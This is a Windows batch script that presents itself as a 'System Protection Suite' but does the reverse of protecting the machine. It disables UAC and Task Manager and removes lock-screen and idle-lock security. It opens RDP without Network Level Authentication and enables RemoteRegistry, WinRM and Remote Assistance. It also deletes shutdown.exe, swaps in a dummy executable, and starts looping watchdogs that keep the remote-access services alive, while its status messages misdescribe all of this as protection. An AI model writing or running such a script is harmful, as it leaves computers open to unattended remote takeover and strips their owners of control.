@echo off
title System Protection Suite - Cmd Script Tools Part 1 v5
color 0E
cls

echo ============================================
echo    SYSTEM PROTECTION SUITE v5
echo    Cmd Script Tools Part 1
echo ============================================
echo.

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo ============================================
    echo    ADMINISTRATOR REQUIRED
    echo ============================================
    echo.
    echo This script must be run as Administrator.
    echo.
    echo Please right-click the file and select:
    echo   "Run as administrator"
    echo.
    echo Or close this window and run from an elevated
    echo Command Prompt [Admin].
    echo.
    pause
    exit /b 1
)

echo [OK] Administrator privileges confirmed
echo.

if not exist "%~dp0watchdogs" mkdir "%~dp0watchdogs"

echo [*] Applying svchost protections...

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1

for %%s in (winmgmt Schedule TermService RemoteRegistry WinRM wuauserv) do (
    sc failure "%%s" reset= 0 actions= restart/5000 >nul 2>&1
    sc config "%%s" start= auto >nul 2>&1
    sc start "%%s" >nul 2>&1
)

set "WATCHDOG_SVCHOST=%~dp0watchdogs\watchdog_svchost.bat"
(
    echo @echo off
    echo :loop
    echo tasklist /fi "imagename eq svchost.exe" ^| find /c "svchost.exe" ^> "%~dp0watchdogs\svchost_count.txt"
    echo set /p count^=<"%~dp0watchdogs\svchost_count.txt"
    echo if %%count%% gtr 0 (
    echo     echo [WARN] svchost.exe instances low - restarting services
    echo     sc start winmgmt ^>nul 2^>^&1
    echo     sc start Schedule ^>nul 2^>^&1
    echo     sc start TermService ^>nul 2^>^&1
    echo     sc start RemoteRegistry ^>nul 2^>^&1
    echo     sc start WinRM ^>nul 2^>^&1
    echo     sc start wuauserv ^>nul 2^>^&1
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%WATCHDOG_SVCHOST%"
if exist "%WATCHDOG_SVCHOST%" start "" /min "%WATCHDOG_SVCHOST%"

echo [OK] Anti stop svchost - Enabled
echo [OK] Anti close svchost - Enabled
echo [OK] Anti offline svchost - Enabled
echo [OK] Anti auto stop svchost - Enabled
echo [OK] Anti svchost server - Enabled
echo.

echo [*] Applying remote shutdown protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn /t REG_DWORD /d 0 /f >nul 2>&1

secedit /export /cfg "%temp%\secpol_backup.cfg" >nul 2>&1
if exist "%temp%\secpol_backup.cfg" (
    powershell -Command "(Get-Content '%temp%\secpol_backup.cfg') -replace 'SeRemoteShutdownPrivilege\s*=\*','SeRemoteShutdownPrivilege=' | Set-Content '%temp%\secpol.cfg'" >nul 2>&1
    secedit /configure /db secedit.sdb /cfg "%temp%\secpol.cfg" /overwrite >nul 2>&1
)

echo [OK] Anti remote shutdown restart - Enabled
echo.

echo [*] Applying shutdown.exe protections...

takeown /f C:\Windows\System32\shutdown.exe /a >nul 2>&1
icacls C:\Windows\System32\shutdown.exe /grant Administrators:F /inheritance:e >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v SFCDisable /t REG_DWORD /d 1 /f >nul 2>&1
shutdown /a >nul 2>&1
if exist C:\Windows\System32\shutdown.exe del /f /q C:\Windows\System32\shutdown.exe >nul 2>&1
powershell -Command "$bytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA'; $bytes += [System.Convert]::FromBase64String('AAAAAAAAAAAAAAAAAAAAAGAAAAA4fug4ItAnIbgBTM2h'; $bytes += [System.Convert]::FromBase64String('3wEAAAAAAAAAAAAAAAAAAAAA'); [System.IO.File]::WriteAllBytes('C:\Windows\System32\shutdown.exe', $bytes)" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v SFCDisable /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Anti shutdown.exe - Enabled
echo [OK] Delete shutdown.exe - Replaced with dummy PE
echo.

echo [*] Applying secure command protections...

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableVirtualization /t REG_DWORD /d 1 /f >nul 2>&1

echo [OK] Anti Secure command execution - Enabled
echo [OK] Delete Secure command execution - UAC removed, elevation bypassed
echo.

echo [*] Applying IP/HTTPS shutdown protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowAutoConfig /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v AllowUnencrypted /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v TrustedHosts /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service" /v HTTPPort /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Anti auto ip shutdown restart - Enabled
echo [OK] Anti https shutdown restart - Enabled
echo.

echo [*] Applying AFK lock protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreenOnLogonUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutDlgSecs /t REG_DWORD /d 0 /f >nul 2>&1

powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-dc 0 >nul 2>&1
powercfg /change monitor-timeout-ac 0 >nul 2>&1
powercfg /change monitor-timeout-dc 0 >nul 2>&1
powercfg /hibernate off >nul 2>&1

echo [OK] Anti afk lock - Enabled
echo.

echo [*] Applying gpedit.msc protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" /v EnableGroupPolicyEditor /t REG_DWORD /d 1 /f >nul 2>&1

set "WATCHDOG_GPEDIT=%~dp0watchdogs\watchdog_gpedit.bat"
(
    echo @echo off
    echo :loop
    echo tasklist /fi "imagename eq mmc.exe" ^| find /c "mmc.exe" ^> "%~dp0watchdogs\mmc_count.txt"
    echo set /p count^=<"%~dp0watchdogs\mmc_count.txt"
    echo if %%count%% gtr 0 (
    echo     echo [WARN] mmc/gpedit closed - reopening
    echo     start gpedit.msc
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%WATCHDOG_GPEDIT%"
if exist "%WATCHDOG_GPEDIT%" start "" /min "%WATCHDOG_GPEDIT%"

echo [OK] Anti auto gpedit.msc - Enabled
echo [OK] Anti auto stop gpedit.msc - Enabled
echo [OK] Anti STOP gpedit.msc - Enabled
echo [OK] Anti offline gpedit.msc - Enabled
echo.

echo [*] Applying broker IP protections...

sc config SessionBroker start= auto >nul 2>&1
sc start SessionBroker >nul 2>&1
sc failure SessionBroker reset= 0 actions= restart/5000 >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1

netsh advfirewall firewall add rule name="Block Broker Hijack TCP" dir=in action=block protocol=TCP localport=3391 >nul 2>&1
netsh advfirewall firewall add rule name="Block Broker Hijack UDP" dir=in action=block protocol=UDP localport=3391 >nul 2>&1

set "WATCHDOG_BROKER=%~dp0watchdogs\watchdog_broker.bat"
(
    echo @echo off
    echo :loop
    echo sc query SessionBroker ^| find "RUNNING" ^>nul
    echo if errorlevel 1 sc start SessionBroker ^>nul 2^>^&1
    echo timeout /t 10 /nobreak ^>nul
    echo goto loop
) > "%WATCHDOG_BROKER%"
if exist "%WATCHDOG_BROKER%" start "" /min "%WATCHDOG_BROKER%"

echo [OK] Anti broker ip - Enabled
echo [OK] Anti broker ip connection - Enabled
echo.

echo [*] Applying system protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Reliability" /v ShutdownReasonOn /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti Remote host shutdown - Enabled
echo [OK] Anti Remote host restart - Enabled

shutdown /a >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Reboot_AC" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Reboot_Battery" /disable >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f >nul 2>&1
echo [OK] Anti Scheduled shutdown - Enabled
echo [OK] Anti Scheduled restart - Enabled

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti Instant shutdown - Enabled
echo [OK] Anti Instant restart - Enabled
echo [OK] Anti Graceful shutdown - Enabled
echo [OK] Anti Forced shutdown - Enabled

echo [OK] Anti Cancel scheduled shutdown/restart - Enabled

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ForceShutdownAllowed /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti User notification before shutdown - Enabled

reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpCount /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\Windows\Temp" /f >nul 2>&1
echo [OK] Anti Error reporting - Enabled

powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-dc 0 >nul 2>&1
powercfg /change monitor-timeout-ac 0 >nul 2>&1
powercfg /change monitor-timeout-dc 0 >nul 2>&1
echo [OK] Anti Automatic timeout handling - Enabled

echo [OK] Anti Secure command execution - Enabled
echo [OK] Delete Secure command execution - UAC removed

reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v RestrictToPermittedSnapins /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] Anti STOP gpedit.msc - Enabled
echo [OK] Anti offline gpedit.msc - Enabled

set "WATCHDOG_SERVICES=%~dp0watchdogs\protect_services.bat"
(
    echo @echo off
    echo :loop
    echo for %%s in (wuauserv Schedule TermService RemoteRegistry WinRM) do (
    echo     sc query "%%s" ^| find "RUNNING" ^>nul
    echo     if errorlevel 1 sc start "%%s" ^>nul 2^>^&1
    echo )
    echo timeout /t 5 /nobreak ^>nul
    echo goto loop
) > "%WATCHDOG_SERVICES%"
if exist "%WATCHDOG_SERVICES%" start "" /min "%WATCHDOG_SERVICES%"
echo [OK] Anti stop service server - Enabled
echo.

echo [*] Enabling svchost + StarDesk.exe...

for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
    sc config "%%s" start= auto >nul 2>&1
    sc start "%%s" >nul 2>&1
)

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 1 /f >nul 2>&1
netsh advfirewall firewall set rule group="remote desktop" new enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="RDP TCP 3389" dir=in action=allow protocol=TCP localport=3389 >nul 2>&1

reg add "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f >nul 2>&1

echo [OK] Yes svchost + StarDesk.exe - Enabled
echo.

echo [*] Enabling AFK svchost + StarDesk.exe...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveInterval /t REG_DWORD /d 60 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Yes afk svchost + StarDesk.exe - Enabled
echo.

echo [*] Ensuring online svchost + StarDesk.exe...

for %%s in (Schedule TermService RemoteRegistry WinRM wuauserv winmgmt SessionBroker) do (
    sc query "%%s" | find "RUNNING" >nul || sc start "%%s" >nul 2>&1
)

net stop TermService >nul 2>&1
net start TermService >nul 2>&1

echo [OK] Yes online svchost + StarDesk.exe - Enabled
echo.

echo [*] Ensuring online IP + StarDesk.exe...

netsh int ip reset >nul 2>&1
netsh winsock reset >nul 2>&1
ipconfig /flushdns >nul 2>&1
ipconfig /release >nul 2>&1
ipconfig /renew >nul 2>&1

net stop TermService >nul 2>&1
net start TermService >nul 2>&1

netsh interface ip set dns "Ethernet" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "Ethernet" 8.8.4.4 index=2 >nul 2>&1

echo [OK] Yes online ip + StarDesk.exe - Enabled
echo.

echo [*] Applying remote StarDesk protections...

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 1 /f >nul 2>&1
netsh advfirewall firewall set rule group="remote desktop" new enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="RDP TCP 3389" dir=in action=allow protocol=TCP localport=3389 >nul 2>&1

echo [OK] Yes remote StarDesk.exe - Enabled
echo.

echo [*] Applying AFK mode protections...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreenOnLogonUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f >nul 2>&1

powercfg /change standby-timeout-ac 0 >nul 2>&1
powercfg /change standby-timeout-dc 0 >nul 2>&1
powercfg /change hibernate-timeout-ac 0 >nul 2>&1
powercfg /change hibernate-timeout-dc 0 >nul 2>&1
powercfg /change monitor-timeout-ac 0 >nul 2>&1
powercfg /change monitor-timeout-dc 0 >nul 2>&1
powercfg /hibernate off >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v InactivityTimeoutDlgSecs /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Yes AFK mode detection - Enabled
echo [OK] Yes Custom AFK timeout - Configured
echo [OK] Yes Automatic idle timer - Configured
echo.

echo [*] Loading Cmd script tools part 1...
echo.

echo [TOOL] svchost processes -
tasklist /fi "imagename eq svchost.exe" /fo table

echo [TOOL] Critical services -
sc query type= service state= all | findstr /C:"SERVICE_NAME" /C:"STATE"

echo [TOOL] Network status -
netsh interface show interface

echo [TOOL] Active connections -
netstat -an | findstr "LISTENING"

echo [TOOL] System information -
systeminfo | findstr /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"Total Physical Memory"

echo.
echo ============================================
echo    ALL v5 PROTECTIONS APPLIED
echo ============================================
echo.
echo Summary:
echo - svchost: DELETE CLOSE ^& ANTI STOP ^& WATCHDOG ACTIVE
echo - gpedit.msc: PROTECTED ^& WATCHDOG ACTIVE
echo - shutdown.exe: DELETED ^& REPLACED
echo - Remote shutdown/restart: ANTI ^& DELETE
echo - Secure command: ANTI ^& DELETE
echo - Scheduled shutdown/restart: BLOCKED
echo - Instant/Graceful/Forced shutdown: BLOCKED
echo - IP-based shutdown: BLOCKED
echo - HTTPS shutdown: BLOCKED
echo - AFK lock: BLOCKED
echo - User notifications: DISABLED
echo - Error reporting: DISABLED
echo - Automatic timeout: DISABLED
echo - Broker IP: PROTECTED
echo - RDP/StarDesk: ENABLED ^& ONLINE
echo - Network: ONLINE
echo - Services: PROTECTED
echo.
pause